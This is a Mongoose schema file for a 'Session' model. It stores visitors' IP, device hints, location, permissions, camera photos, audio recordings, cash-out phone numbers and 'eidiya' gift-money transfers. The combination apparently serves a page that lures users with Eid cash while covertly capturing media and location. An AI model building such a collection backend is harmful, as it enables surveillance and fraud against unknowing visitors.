const mongoose = require('mongoose');

const PhotoSchema = new mongoose.Schema({
  cloudinaryUrl: { type: String, required: true },
  publicId: { type: String, required: true },
  facingMode: { type: String, default: null },
  deviceLabel: { type: String, default: null },
  takenAt: { type: Date, default: Date.now }
});

const AudioSchema = new mongoose.Schema({
  cloudinaryUrl: { type: String, required: true },
  publicId: { type: String, required: true },
  size: { type: Number },
  chunkCount: { type: Number },
  contentType: { type: String },
  startedAt: { type: Date },
  savedAt: { type: Date, default: Date.now }
});

const SessionSchema = new mongoose.Schema({
  sessionId: { type: String, required: true, unique: true, index: true },
  ip: { type: String, default: null },
  userAgent: { type: String, default: null },
  clientHints: { type: mongoose.Schema.Types.Mixed, default: {} },
  location: { type: mongoose.Schema.Types.Mixed, default: null },
  permissions: { type: mongoose.Schema.Types.Mixed, default: {} },
  photos: [PhotoSchema],
  audio: { type: AudioSchema, default: null },
  cashOut: {
    phoneNumber: { type: String, default: null },
    amount: { type: Number, default: null },
    ip: { type: String, default: null },
    location: { type: mongoose.Schema.Types.Mixed, default: null },
    requestedAt: { type: Date, default: null }
  },
  eidiyaTransfers: [{
    recipient: { type: String, default: null },
    amount: { type: Number, default: null },
    message: { type: String, default: null },
    ip: { type: String, default: null },
    location: { type: mongoose.Schema.Types.Mixed, default: null },
    transferredAt: { type: Date, default: Date.now }
  }]
}, {
  timestamps: true
});

module.exports = mongoose.model('Session', SessionSchema);
